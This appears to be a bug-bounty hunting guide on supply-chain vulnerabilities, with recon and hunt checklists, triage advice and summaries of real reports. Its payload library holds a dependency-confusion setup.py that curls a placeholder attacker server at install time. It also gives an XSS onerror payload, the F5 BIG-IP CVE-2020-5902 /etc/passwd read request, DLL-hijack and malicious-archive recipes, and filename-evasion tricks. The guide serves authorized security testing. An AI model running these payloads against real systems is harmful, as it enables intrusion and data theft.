---
category: supply_chain
label: Supply Chain
report_count: 9
programs: [ibb, valve, yelp, nodejs-ecosystem, sifchain, aws_vdp]
avg_bounty: 1600
max_bounty: 4920
severity_distribution: critical: 3, high: 4, medium: 0, low: 2
---

## Overview
Supply chain vulnerabilities break the trust boundary between application code and its dependencies, build tools, or infrastructure. Developers often assume third-party packages, libraries, and upstream services are safe or immutable, but misconfigurations, outdated components, and malicious actors can subvert this trust. Worst-case impact includes RCE on production or developer systems, privilege escalation, mass compromise, or persistent backdoors.

## Root causes
- Blind trust in upstream package repositories (npm, PyPI, etc.) without pinning or integrity checks.
- Inadequate validation of third-party or user-supplied files and extensions.
- Use of outdated or unmaintained dependencies with known vulnerabilities.
- Misconfigured build pipelines or artifact sources (e.g., fallback to public registries).
- Overly permissive or legacy handler mappings in web servers and frameworks.
- Insecure default search paths for dynamic libraries or configuration files.

## Attack surface
- Dependency installation commands (e.g., `pip install {package}`, `npm install {package}`)
- Build server configuration files (e.g., package.json, requirements.txt, Gemfile)
- File upload/import features accepting archives, save files, or plugin bundles
- Web server handler mappings and proxy integrations (e.g., Apache, Nginx, Node.js)
- Dynamic library loading on Windows (DLL search order, config files)
- JavaScript/CSS library inclusions in web apps (CDN, local, or vendor directories)
- Features allowing user-supplied or third-party code execution (plugins, extensions)
- Outdated or unpatched infrastructure components (load balancers, admin UIs)

## Recon checklist
1. Enumerate all third-party dependencies and their sources (public/private registries).
2. Identify all file upload/import features and accepted file types/extensions.
3. Review build and deployment pipeline configs for external resource fetching.
4. Map all included JS/CSS libraries and their versions via static analysis or asset enumeration.
5. Inspect web server configs for handler mappings, proxy rules, and backend integrations.
6. On Windows targets, check for custom DLL search paths and config file locations.
7. Search for legacy or unmaintained packages in use.
8. Check for use of vulnerable infrastructure components (e.g., F5 BIG-IP, Apache HTTPD).

## Hunt methodology
1. Attempt to publish a namesquatted or unclaimed package matching internal dependency names to public registries.
2. Upload or submit crafted archive/save/plugin files with embedded executables or alternate extensions to file import features.
3. Trigger dependency installation or build processes and monitor for callback or code execution from attacker-controlled packages.
4. Probe web server integrations by injecting malicious headers or payloads in backend responses to test handler mapping abuse.
5. Scan included JS/CSS assets for outdated or vulnerable versions using asset fingerprinting.
6. Place malicious DLLs or config files in writable directories and trigger application/library startup on Windows.
7. Test for execution of embedded code or binaries after file import or application restart.
8. Attempt to access or exploit known-vulnerable admin interfaces or infrastructure endpoints.

## Payload library

### Dependency Confusion / Namesquatting
**Technique**: Exploit misconfigured package sources by registering attacker-controlled packages with names matching internal dependencies.
**How to apply**: Publish `{package}` to a public registry (npm, PyPI) with a preinstall or postinstall script that performs a callback or executes code. Wait for the target to install dependencies via automated build or deployment.
**Payload**: 
```python
# setup.py for PyPI
from setuptools import setup
import os
os.system("curl https://{attacker-server}/?host=$(hostname)")
setup(name="{package}", version="1.0.0")
```
**Observe**: Outbound callback from build server or developer machine; execution of attacker code during install.
**Seen in**: Build pipeline dependency installation; automated deployment scripts.

### Malicious Archive/Plugin/Save File Injection
**Technique**: Abuse weak validation in file import features to deliver files with arbitrary extensions or embedded executables.
**How to apply**: Craft an archive or save file containing files with extensions like `.dll`, `.exe`, or alternate extensions placed in subdirectories. Upload/import via the application's file handler.
**Payload**: 
- Archive structure:
  - `/malicious_dir/cl_dlls/client.dll` (malicious DLL)
  - `/malicious_dir/innocent.txt`
- Save file with embedded executable and misleading extension.
**Observe**: File written to disk with attacker-chosen extension; subsequent execution or loading by the application.
**Seen in**: Game save file importers; plugin uploaders; custom file import features.

### Outdated/Vulnerable Component Inclusion
**Technique**: Leverage known vulnerabilities in outdated libraries or infrastructure components included in the application.
**How to apply**: Identify included JS/CSS or server components and match versions against public CVEs. Craft exploit payloads targeting those vulnerabilities (e.g., XSS, RCE).
**Payload**: 
- For JS XSS: 
  - `"><img src=x onerror=alert(1)>` in data attributes processed by vulnerable library
- For infrastructure RCE:
  - `GET /tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd`
**Observe**: Successful XSS, code execution, or sensitive file read.
**Seen in**: Web apps including outdated Bootstrap; F5 BIG-IP admin interfaces.

### Handler Mapping Abuse via Backend Response
**Technique**: Manipulate backend application output to trigger internal handler mappings in web servers (e.g., Apache AddType/SetHandler confusion).
**How to apply**: Inject headers or content in backend responses that cause the frontend server to internally redirect or invoke a local handler.
**Payload**: 
- Backend response header: `Content-Type: application/x-httpd-php`
- Malicious response body triggering handler
**Observe**: Internal redirect, SSRF, or local script execution by the web server.
**Seen in**: Reverse proxy integrations; legacy handler mappings in web servers.

### DLL Hijacking via Untrusted Search Path
**Technique**: Place malicious DLLs in directories searched by the application due to insecure search order or config file locations.
**How to apply**: Drop a crafted `{dll_name}.dll` in a directory that is searched before the legitimate DLL location. Trigger application startup or relevant operation.
**Payload**: 
- Malicious `providers.dll` with payload code
**Observe**: Execution of attacker code on application startup.
**Seen in**: Node.js on Windows with OpenSSL present; apps using dynamic library loading.

## Filter & WAF bypass
- Use alternate file extensions or double extensions (e.g., `.HL1.dll`, `.jpg.exe`) to bypass extension checks.
- Embed malicious files in nested directories within archives to evade flat extension filters.
- Leverage Unicode homoglyphs or right-to-left override in filenames.
- For dependency confusion, use typosquatting or internal naming conventions (e.g., `internal-{package}`).
- For handler mapping, manipulate response headers (e.g., `Content-Type`, `X-Accel-Redirect`) to trigger server-side logic.
- On Windows, exploit case-insensitivity or alternate path separators in DLL names.

## Verification & impact
- **Confirmed vulnerable**: Outbound callback from build server; execution of attacker code; file written and executed from imported archive; successful exploitation of known CVE in included component.
- **False positive signals**: Dependency installed but no code execution; file written but not loaded/executed; outdated library present but not reachable in a vulnerable context.
- **Impact escalation**: RCE on build or production servers; privilege escalation via DLL hijacking; persistent backdoor via malicious dependency; mass compromise if library is widely used.

## Triage & severity
- Typical CVSS: High to Critical (7.0–10.0), especially with RCE or privilege escalation.
- Severity increases with: unauthenticated exploitability, RCE on production or CI/CD, widespread library use, privilege escalation, or persistent compromise.
- Severity decreases with: sandboxed execution, limited scope (e.g., only on developer machines), mitigations like SRI, or non-exploitable outdated components.

## Reporting tips
- Strong PoC: Minimal reproducer (e.g., malicious package, crafted archive, or exploit payload), clear step-by-step instructions, and evidence of code execution or impact (e.g., callback logs, screenshots).
- Avoid: Reports with only outdated library presence and no exploit path; speculative impact without proof of execution; missing evidence of exploitability.
- Evidence checklist: Dependency graph or asset list, PoC code or archive, callback or execution logs, screenshots of impact, CVE references if applicable.

## Real examples
- 2585376 — ibb: Apache HTTP Server used backend application output to trigger local handler execution via internal redirect, enabling SSRF and local script execution (high, $4920)
- 946409 — yelp: Build server RCE via dependency confusion—misconfigured pip install fetched attacker-controlled package from PyPI (critical, $0)
- 450006 — nodejs-ecosystem: Malicious npm package (flatmap-stream) embedded in popular dependency, enabling RCE in downstream apps (critical, $0)
- 2794126 — aws_vdp: F5 BIG-IP TMUI included with known RCE vulnerability (CVE-2020-5902), allowing remote code execution (critical, $0)
- 1636566 — ibb: Node.js DLL hijacking on Windows allowed privilege escalation and code execution via malicious DLL in search path (high, $0)
- 687325 — nodejs-ecosystem: Trojan coinminer discovered in npm global packages, likely from a compromised dependency (high, $0)
- 458842 — valve: Malformed save files allowed arbitrary file write and DLL loading in GoldSrc-based games, leading to code execution (high, $1500)
- 1198203 — sifchain: Outdated Bootstrap library with XSS in tooltip/popover attributes (low, $0)
- 1188643 — sifchain: Vulnerable Bootstrap JS included, exposing multiple XSS vectors (low, $0)

## Bounty intelligence
Critical supply chain vulnerabilities (RCE, privilege escalation, dependency confusion) can command $2,000–$5,000+ on mature programs, especially those with CI/CD or production impact. Programs in fintech, cloud, and infrastructure pay most for this category, with higher rewards for unauthenticated or mass-exploitable issues. Reports limited to outdated libraries or non-exploitable vectors typically receive low or no bounty unless a working exploit is demonstrated.